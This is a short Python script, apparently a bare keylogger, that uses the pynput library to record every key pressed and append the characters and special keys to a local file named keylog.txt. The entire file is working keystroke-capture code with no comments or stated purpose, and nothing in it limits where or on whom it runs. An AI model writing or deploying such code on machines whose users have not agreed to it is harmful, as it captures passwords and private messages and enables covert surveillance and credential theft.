from pynput import keyboard

def keyPressed(key):
    print(str(key))
    with open("keylog.txt", 'a') as logKey:
        if hasattr(key, 'char'):
            logKey.write(key.char)
        else:
            logKey.write(f"[{key}]")
        
if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()